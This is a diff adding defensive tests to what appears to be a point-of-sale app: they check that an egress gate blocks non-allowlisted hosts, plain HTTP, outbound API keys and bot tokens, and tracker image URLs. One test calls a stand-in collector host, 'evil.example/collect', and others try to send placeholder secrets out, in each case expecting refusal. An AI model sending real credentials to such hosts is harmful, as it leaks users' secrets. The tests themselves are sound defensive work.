@@ -154,3 +154,45 @@ test('sandbox page forbids all network access', async () => {
   assert.match(app.headers.get('content-security-policy'), /script-src 'self' 'nonce-/);
   assert.match(app.headers.get('x-robots-tag'), /noai/);
 });
+
+test('egress gate: allowlist, offline mode, key pinning, no fingerprint headers', async () => {
+  const { egressFetch, egressActivity } = await import('../server/security/egress.js');
+  const http = await import('node:http');
+  // A local endpoint stands in for "the outside world" so we can inspect what would be sent.
+  let seen = null;
+  const sink = http.createServer((q, s) => { let b = ''; q.on('data', (c) => { b += c; }); q.on('end', () => { seen = { headers: q.headers, body: b }; s.end('{}'); }); });
+  await new Promise((r) => sink.listen(0, '127.0.0.1', r));
+  const local = `http://127.0.0.1:${sink.address().port}/hook`;
+
+  await egressFetch(local, { method: 'POST', headers: { 'x-stainless-os': 'Linux', 'x-stainless-arch': 'x64', 'user-agent': 'node', referer: 'http://localhost:4321/b/token' }, body: '{"a":1}' });
+  assert.equal(seen.headers['user-agent'], 'POS');
+  assert.equal(seen.headers['x-stainless-os'], undefined);
+  assert.equal(seen.headers['x-stainless-arch'], undefined);
+  assert.equal(seen.headers.referer, undefined);
+
+  await assert.rejects(egressFetch('https://evil.example/collect'), /not an enabled connector/);
+  await assert.rejects(egressFetch('http://api.stripe.com/v1'), /only HTTPS/);
+
+  settings.setGroup('telegram', { enabled: true, botToken: '123456789:secret-telegram-token-abcdef', chatId: '1' });
+  settings.setGroup('ai', { apiKey: 'sk-ant-pinned-key-0000000' });
+  await assert.rejects(egressFetch('https://api.telegram.org/bot1/sendMessage', { method: 'POST', body: 'key=sk-ant-pinned-key-0000000' }), /ai\.apiKey may not be sent/);
+  await assert.rejects(egressFetch(local, { method: 'POST', body: 'token 123456789:secret-telegram-token-abcdef' }), /telegram\.botToken may not be sent/);
+  await assert.rejects(egressFetch(local, { method: 'POST', body: 'pos_abcdefghijklmnopqrstuvwxyz012345' }), /POS API keys never leave/);
+
+  settings.setGroup('privacy', { offline: true });
+  await assert.rejects(egressFetch(local), /offline mode/);
+  settings.setGroup('privacy', { offline: false });
+  assert.ok(egressActivity().recent.some((e) => e.blocked));
+  assert.ok(ledger.recent({ kind: 'security.egress_blocked' }).length >= 3);
+  sink.close();
+});
+
+test('external images are refused; uploads only', async () => {
+  const r = await req('PUT', '/api/settings/business', { values: { logoUrl: 'https://tracker.example/pixel.png' } }, FULL);
+  assert.equal(r.status, 400);
+  const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+  assert.equal((await req('PUT', '/api/settings/business', { values: { logoUrl: png } }, FULL)).status, 200);
+  const csp = (await fetch(`${B}/`)).headers.get('content-security-policy');
+  assert.match(csp, /img-src 'self' data: blob:;/);
+  assert.equal((await fetch(`${B}/`)).headers.get('referrer-policy'), 'no-referrer');
+});
